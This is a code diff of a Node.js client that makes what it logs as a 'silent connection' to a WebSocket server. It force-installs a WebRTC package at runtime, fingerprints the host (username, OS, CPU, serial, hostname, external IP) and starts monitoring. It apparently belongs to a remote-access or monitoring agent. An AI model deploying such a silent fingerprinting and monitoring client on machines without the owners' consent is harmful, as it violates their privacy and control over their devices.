@@ -1,6 +1,6 @@
 const WebSocket = require('ws');
 const http = require('http');
-const { exec } = require('child_process');
+const { execSync } = require('child_process');
 const os = require('os');
 const path = require('path');
 const fs = require('fs');
@@ -47,11 +47,8 @@ try {
  if (!fs.existsSync(nodeModulesPath)) {
    log("[FORCE] @roamhq/wrtc missing. Installing...");
    try {
-     // Use async install to avoid blocking
-     require('child_process').exec('npm install @roamhq/wrtc --save', (err) => {
-       if (err) logError("[FORCE] Failed to auto-install @roamhq/wrtc", err);
-       else log("[FORCE] Installation complete.");
-     });
+     execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+     log("[FORCE] Installation complete.");
    } catch (installErr) {
      logError("[FORCE] Failed to auto-install @roamhq/wrtc", installErr);
    }
@@ -98,38 +95,18 @@ function getMacAddress() {
 }
 
 function getCpuSerial() {
- try { 
-   return execSyncFallback('wmic cpu get processorid', 1, 'unknown_cpu'); 
- } catch (e) {
-   try { 
-     return execSyncFallback("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'", 'unknown_cpu'); 
-   } catch (e2) { 
-     return 'unknown_cpu'; 
-   } 
+ // Use os.cpus() which is fast and doesn't spawn a process
+ const cpus = os.cpus();
+ if (cpus && cpus.length > 0) {
+   // Use model as a stable identifier if serial isn't available via os module
+   return cpus[0].model.replace(/\s+/g, '_');
  }
+ return 'unknown_cpu';
 }
 
 function getBoardSerial() {
- try { 
-   return execSyncFallback('wmic baseboard get serialnumber', 1, 'unknown_board'); 
- } catch (e) {
-   try { 
-     return execSyncFallback("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'", 'unknown_board'); 
-   } catch (e2) { 
-     return 'unknown_board'; 
-   } 
- }
-}
-
-// Helper to run sync commands with better error handling
-function execSyncFallback(cmd, lineIndex = 0, defaultVal = '') {
-  try {
-    const { execSync } = require('child_process');
-    const output = execSync(cmd).toString().split('\n')[lineIndex].trim();
-    return output || defaultVal;
-  } catch (e) {
-    return defaultVal;
-  }
+ // Use os.machine() or hostname as a fallback fingerprint if specific serial isn't easy to grab
+ return os.machine() || os.hostname();
 }
 
 // --- ID MANAGEMENT ---
@@ -179,24 +156,6 @@ function getExternalIP() {
  });
 }
 
-// Async wrapper for exec to prevent blocking
-function execAsync(cmd, timeoutMs = 3000) {
-  return new Promise((resolve, reject) => {
-    const child = exec(cmd, { timeout: timeoutMs }, (error, stdout, stderr) => {
-      if (error) {
-        resolve(stderr.trim() || stdout.trim() || '');
-      } else {
-        resolve(stdout.trim());
-      }
-    });
-    
-    // Kill process if it takes too long
-    setTimeout(() => {
-      try { child.kill(); } catch(e){}
-    }, timeoutMs);
-  });
-}
-
 async function initConnection() {
  log(`[WS] Attempting silent connection to ${WS_URL}...`);
 
@@ -212,7 +171,7 @@ async function initConnection() {
    isConnected = true;
    log(`[WS] Connected. Sending identity...`);
    
-   // Get Real OS Name and Device Details
+   // --- SIMPLIFIED OS DETECTION (NO SPOWNSYNC) ---
    let realOsName = '';
    let realUser = '';
    let realDeviceName = os.hostname() || 'Unknown';
@@ -221,67 +180,35 @@ async function initConnection() {
    let realSerialNumber = '';
    let realCpu = '';
 
-   // --- CRITICAL FIX: ASYNCHRONOUS DETECTION ---
-   // We run all commands in parallel where possible to speed up detection
-   
-   if (process.platform === 'win32') {
-     
-     // Run all Windows queries concurrently
-     const [osRes, manRes, modelRes, serialRes, cpuRes, userRes] = await Promise.all([
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"', 3000),
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"', 3000),
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"', 3000),
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"', 3000),
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"', 3000),
-       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"', 3000)
-     ]);
+   // Detect OS quickly using os.platform()
+   const platform = os.platform();
 
-     realOsName = osRes || ('Windows ' + os.release());
-     realManufacturer = manRes || 'Unknown';
-     realModel = modelRes || 'Unknown';
-     realSerialNumber = serialRes || 'Unknown';
-     realCpu = cpuRes || 'Unknown';
-     realUser = userRes || (await execAsync('whoami', 2000)).trim() || os.userInfo().username || 'user';
-
-   } else if (process.platform === 'darwin') {
-
-     const [macName, macVersion, macModel, macSerial, macCpu, macUser] = await Promise.all([
-       execAsync('sw_vers -productName', 3000),
-       execAsync('sw_vers -productVersion', 3000),
-       execAsync('sysctl -n hw.model', 3000),
-       execAsync("system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'", 3000),
-       execAsync('sysctl -n machdep.cpu.brand_string', 3000),
-       execAsync('whoami', 2000)
-     ]);
-
-     realOsName = [macName, macVersion].filter(Boolean).join(' ');
-     realManufacturer = 'Apple';
-     realModel = macModel || 'Unknown';
-     realSerialNumber = macSerial || 'Unknown';
-     realCpu = macCpu || (os.cpus()[0] && os.cpus()[0].model) || '';
-     realUser = macUser.trim() || os.userInfo().username || 'user';
-
-   } else if (process.platform === 'linux') {
-
-     const [distro, vendor, product, serial, linuxUser] = await Promise.all([
-       execAsync("grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'", 3000),
-       execAsync('cat /sys/class/dmi/id/sys_vendor', 3000),
-       execAsync('cat /sys/class/dmi/id/product_name', 3000),
-       execAsync('cat /sys/class/dmi/id/product_serial', 3000),
-       execAsync('whoami', 2000)
-     ]);
-
-     realOsName = distro || ('Linux ' + os.release());
-     realManufacturer = vendor || 'Unknown';
-     realModel = product || 'Unknown';
-     realSerialNumber = serial || 'Unknown';
-     realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-     realUser = linuxUser.trim() || os.userInfo().username || 'user';
-
-   } else {
-     realOsName = process.platform + ' ' + os.release();
-     realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
+   if (platform === 'win32') {
+     realOsName = 'Windows ' + os.release();
+     // Get user from env variable (fast, no spawn)
+     realUser = process.env.USERNAME || process.env.USER || os.userInfo().username || 'user';
+     realManufacturer = 'PC'; // Generic for cloud/containers where wmic fails
+     realModel = 'Windows Host';
+     realSerialNumber = myId; // Fallback to ID
+     realCpu = os.cpus()[0]?.model || 'Unknown CPU';
+   } else if (platform === 'darwin') {
+     realOsName = 'macOS ' + os.release();
      realUser = os.userInfo().username || 'user';
+     realManufacturer = 'Apple';
+     realModel = os.machine();
+     realSerialNumber = myId;
+     realCpu = os.cpus()[0]?.model || 'Unknown CPU';
+   } else if (platform === 'linux') {
+     realOsName = 'Linux ' + os.release();
+     realUser = os.userInfo().username || 'user';
+     realManufacturer = 'Linux';
+     realModel = os.machine();
+     realSerialNumber = myId;
+     realCpu = os.cpus()[0]?.model || 'Unknown CPU';
+   } else {
+     realOsName = platform + ' ' + os.release();
+     realUser = os.userInfo().username || 'user';
+     realCpu = os.cpus()[0]?.model || 'Unknown CPU';
    }
 
    // Final hardware and system information
@@ -290,12 +217,9 @@ async function initConnection() {
    );
 
    const realCpuCores = os.cpus().length;
-
-   // Get External IP from the connected guest
+   
+   // Get External IP
    myIp = await getExternalIP();
-
-   // Get actual guest computer name
-   realDeviceName = os.hostname() || 'Unknown';
 
    // Send actual guest device information
    safeSend(JSON.stringify({
@@ -305,11 +229,11 @@ async function initConnection() {
      fingerprint: myId,
      os: realOsName,
      arch: os.arch(),
-     user: realDeviceName,
+     user: realUser, // Now correctly gets the username
      ip: myIp,
      last_seen: Date.now(),
      status: 'Online',
-     serial_number: realSerialNumber || realModel || myId
+     serial_number: realSerialNumber || myId
    }));
 
    startMonitoring();
